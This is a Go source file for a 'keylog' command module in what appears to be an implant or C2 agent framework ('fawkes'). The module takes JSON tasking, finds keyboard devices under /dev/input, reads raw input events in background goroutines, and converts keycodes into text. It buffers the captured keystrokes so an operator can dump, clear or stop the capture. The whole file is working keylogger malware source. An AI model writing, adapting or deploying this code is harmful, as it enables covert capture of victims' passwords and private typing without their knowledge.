//go:build linux

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

// inputEvent matches the Linux input_event struct (24 bytes on 64-bit).
type inputEvent struct {
	TimeSec  int64  // tv_sec
	TimeUsec int64  // tv_usec
	Type     uint16 // event type
	Code     uint16 // key code
	Value    int32  // 0=release, 1=press, 2=repeat
}

const (
	evKey          = 0x01 // EV_KEY
	inputEventSize = 24   // sizeof(struct input_event) on 64-bit
)

// keylogState holds the global keylogger state.
type keylogState struct {
	mu        sync.Mutex
	running   bool
	stopCh    chan struct{}
	buffer    strings.Builder
	startTime time.Time
	keyCount  int
	shiftDown bool
}

var kl = &keylogState{}

type KeylogCommand struct{}

func (c *KeylogCommand) Name() string {
	return "keylog"
}

func (c *KeylogCommand) Description() string {
	return "Start/stop/dump a low-level keyboard logger via /dev/input"
}

type keylogArgs struct {
	Action string `json:"action"`
}

func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
	var args keylogArgs

	if task.Params == "" {
		return errorResult("Error: action required. Use: start, stop, dump, status, clear")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	switch strings.ToLower(args.Action) {
	case "start":
		return keylogStart()
	case "stop":
		return keylogStop()
	case "dump":
		return keylogDump()
	case "status":
		return keylogStatus()
	case "clear":
		return keylogClear()
	default:
		return errorf("Unknown action: %s. Use: start, stop, dump, status, clear", args.Action)
	}
}

func keylogStart() structs.CommandResult {
	kl.mu.Lock()
	if kl.running {
		kl.mu.Unlock()
		return errorResult("Keylogger is already running")
	}
	kl.running = true
	kl.buffer.Reset()
	kl.startTime = time.Now()
	kl.keyCount = 0
	kl.shiftDown = false
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()

	devices, err := findKeyboardDevices()
	if err != nil || len(devices) == 0 {
		kl.mu.Lock()
		kl.running = false
		kl.mu.Unlock()
		if err != nil {
			return errorf("Error finding keyboard devices: %v", err)
		}
		return errorResult("No keyboard input devices found. Need root or input group membership.")
	}

	for _, dev := range devices {
		go keylogReadDevice(dev, kl.stopCh)
	}

	return successf("Keylogger started on %d device(s). Use 'keylog -action dump' to view captured keystrokes, 'keylog -action stop' to stop.", len(devices))
}

func keylogStop() structs.CommandResult {
	kl.mu.Lock()
	if !kl.running {
		kl.mu.Unlock()
		return errorResult("Keylogger is not running")
	}

	close(kl.stopCh)

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)
	keyCount := kl.keyCount
	kl.running = false
	kl.buffer.Reset()
	kl.mu.Unlock()

	result := fmt.Sprintf("Keylogger stopped.\nDuration: %s\nKeystrokes captured: %d\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), keyCount, output)

	return successResult(result)
}

func keylogDump() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return errorResult("Keylogger is not running")
	}

	output := kl.buffer.String()
	duration := time.Since(kl.startTime)

	if output == "" {
		return successf("Keylogger running for %s — no keystrokes captured yet", duration.Round(time.Second))
	}

	result := fmt.Sprintf("Keylogger running for %s — %d keystrokes captured\n\n--- Captured Keystrokes ---\n%s",
		duration.Round(time.Second), kl.keyCount, output)

	return successResult(result)
}

func keylogStatus() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return successResult("Keylogger is not running.")
	}

	duration := time.Since(kl.startTime)
	bufSize := kl.buffer.Len()

	return successf("Keylogger status:\n  State:      running\n  Duration:   %s\n  Keystrokes: %d\n  Buffer:     %s",
		duration.Round(time.Second), kl.keyCount, formatFileSize(int64(bufSize)))
}

func keylogClear() structs.CommandResult {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return errorResult("Keylogger is not running")
	}

	cleared := kl.keyCount
	kl.buffer.Reset()
	kl.keyCount = 0

	return successf("Buffer cleared (%d keystrokes removed). Keylogger continues running.", cleared)
}

// findKeyboardDevices scans /dev/input/event* for keyboard-capable devices.
func findKeyboardDevices() ([]string, error) {
	matches, err := filepath.Glob("/dev/input/event*")
	if err != nil {
		return nil, err
	}

	var keyboards []string
	for _, path := range matches {
		if isKeyboard(path) {
			keyboards = append(keyboards, path)
		}
	}
	return keyboards, nil
}

// isKeyboard checks if an input device supports keyboard events by
// reading EV_KEY capability via ioctl EVIOCGBIT.
func isKeyboard(path string) bool {
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()

	// EVIOCGBIT(0, ...) returns the event types supported.
	// We check bit 1 (EV_KEY). The ioctl number is computed as:
	// _IOC(_IOC_READ, 'E', 0x20+0, size) for ev type 0
	// Rather than syscalling ioctl, check /sys/class/input for capabilities.
	// Simpler approach: try to read a few bytes — if we can open it, check
	// /sys/class/input/eventN/device/capabilities/ev for EV_KEY bit.
	f.Close()

	// Extract eventN from path
	base := filepath.Base(path)
	capPath := fmt.Sprintf("/sys/class/input/%s/device/capabilities/ev", base)
	data, err := os.ReadFile(capPath)
	if err != nil {
		// Can't read capabilities — skip this device
		return false
	}

	caps := strings.TrimSpace(string(data))
	// EV_KEY = 1, so bit 1 must be set. The capabilities are hex bitmasks.
	// Common keyboard value: "120013" (bits 0,1,4,17,20 = SYN,KEY,MSC,LED,REP)
	// We check if bit 1 (EV_KEY) is set in the last hex nibble.
	if caps == "" {
		return false
	}

	// Parse the last hex character to check bit 1
	lastChar := caps[len(caps)-1]
	var nibble uint64
	if lastChar >= '0' && lastChar <= '9' {
		nibble = uint64(lastChar - '0')
	} else if lastChar >= 'a' && lastChar <= 'f' {
		nibble = uint64(lastChar-'a') + 10
	}

	// Bit 1 = EV_KEY
	if nibble&0x02 == 0 {
		return false
	}

	// Also verify it has actual key codes (not just a power button).
	// Check key capabilities for common keyboard keys (KEY_A=30).
	keyCapPath := fmt.Sprintf("/sys/class/input/%s/device/capabilities/key", base)
	keyData, err := os.ReadFile(keyCapPath)
	if err != nil {
		return false
	}
	keyStr := strings.TrimSpace(string(keyData))
	// A real keyboard will have many bits set. A simple check: the key
	// capabilities string should be longer than a few characters.
	return len(keyStr) > 10
}

// keylogReadDevice reads input events from a single device file.
func keylogReadDevice(path string, stopCh <-chan struct{}) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	buf := make([]byte, inputEventSize)
	for {
		select {
		case <-stopCh:
			return
		default:
		}

		// Set a read deadline so we can check the stop channel periodically
		_ = f.SetReadDeadline(time.Now().Add(500 * time.Millisecond))

		n, err := f.Read(buf)
		if err != nil {
			if os.IsTimeout(err) {
				continue
			}
			return
		}
		if n < inputEventSize {
			continue
		}

		var ev inputEvent
		ev.TimeSec = int64(binary.LittleEndian.Uint64(buf[0:8]))
		ev.TimeUsec = int64(binary.LittleEndian.Uint64(buf[8:16]))
		ev.Type = binary.LittleEndian.Uint16(buf[16:18])
		ev.Code = binary.LittleEndian.Uint16(buf[18:20])
		ev.Value = int32(binary.LittleEndian.Uint32(buf[20:24]))

		if ev.Type != evKey {
			continue
		}

		kl.mu.Lock()

		// Track modifier state on press/release
		if ev.Code == 42 || ev.Code == 54 { // KEY_LEFTSHIFT, KEY_RIGHTSHIFT
			kl.shiftDown = ev.Value != 0
			kl.mu.Unlock()
			continue
		}

		// Only process key press events (value=1), not release(0) or repeat(2)
		if ev.Value == 1 {
			keyName := linuxKeyToString(ev.Code, kl.shiftDown)
			if keyName != "" {
				kl.buffer.WriteString(keyName)
				kl.keyCount++
			}
		}

		kl.mu.Unlock()
	}
}

// linuxKeyToString converts a Linux keycode to a human-readable string.
func linuxKeyToString(code uint16, shift bool) string {
	// Modifier keys — suppress output
	switch code {
	case 29, 97: // KEY_LEFTCTRL, KEY_RIGHTCTRL
		return ""
	case 56, 100: // KEY_LEFTALT, KEY_RIGHTALT
		return ""
	case 125, 126: // KEY_LEFTMETA, KEY_RIGHTMETA
		return "[SUPER]"
	}

	// Special keys
	switch code {
	case 1:
		return "[ESC]"
	case 14:
		return "[BS]"
	case 15:
		return "[TAB]"
	case 28:
		return "[ENTER]\n"
	case 57:
		return " "
	case 58:
		return "[CAPS]"
	case 103:
		return "[UP]"
	case 108:
		return "[DOWN]"
	case 105:
		return "[LEFT]"
	case 106:
		return "[RIGHT]"
	case 111:
		return "[DEL]"
	case 102:
		return "[HOME]"
	case 107:
		return "[END]"
	case 104:
		return "[PGUP]"
	case 109:
		return "[PGDN]"
	case 110:
		return "[INS]"
	}

	// Function keys: F1=59..F12=88
	if code >= 59 && code <= 70 {
		return fmt.Sprintf("[F%d]", code-58)
	}
	if code == 87 {
		return "[F11]"
	}
	if code == 88 {
		return "[F12]"
	}

	// Number row: KEY_1=2..KEY_0=11
	if code >= 2 && code <= 11 {
		if shift {
			shiftedNum := []string{"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"}
			return shiftedNum[code-2]
		}
		if code == 11 {
			return "0"
		}
		return string(rune('0' + code - 1))
	}

	// Letter keys: KEY_Q=16..KEY_P=25, KEY_A=30..KEY_L=38, KEY_Z=44..KEY_M=50
	letter := linuxCodeToLetter(code)
	if letter != 0 {
		if shift {
			return string(letter - 32) // uppercase
		}
		return string(letter)
	}

	// Punctuation keys
	return linuxCodeToPunct(code, shift)
}

// linuxCodeToLetter maps Linux keycodes to lowercase ASCII letters.
func linuxCodeToLetter(code uint16) byte {
	keyMap := map[uint16]byte{
		16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't',
		21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
		30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
		35: 'h', 36: 'j', 37: 'k', 38: 'l',
		44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b',
		49: 'n', 50: 'm',
	}
	return keyMap[code]
}

// linuxCodeToPunct maps Linux keycodes to punctuation characters.
func linuxCodeToPunct(code uint16, shift bool) string {
	type punctPair struct {
		normal  string
		shifted string
	}
	punctMap := map[uint16]punctPair{
		12: {"-", "_"},
		13: {"=", "+"},
		26: {"[", "{"},
		27: {"]", "}"},
		39: {";", ":"},
		40: {"'", "\""},
		41: {"`", "~"},
		43: {"\\", "|"},
		51: {",", "<"},
		52: {".", ">"},
		53: {"/", "?"},
	}

	if p, ok := punctMap[code]; ok {
		if shift {
			return p.shifted
		}
		return p.normal
	}

	// Numpad keys
	if code >= 71 && code <= 83 {
		numpad := map[uint16]string{
			71: "7", 72: "8", 73: "9", 74: "-",
			75: "4", 76: "5", 77: "6", 78: "+",
			79: "1", 80: "2", 81: "3",
			82: "0", 83: ".",
		}
		if s, ok := numpad[code]; ok {
			return s
		}
	}

	if code == 55 { // KP_MULTIPLY
		return "*"
	}
	if code == 98 { // KP_DIVIDE
		return "/"
	}
	if code == 96 { // KP_ENTER
		return "[ENTER]\n"
	}

	return ""
}
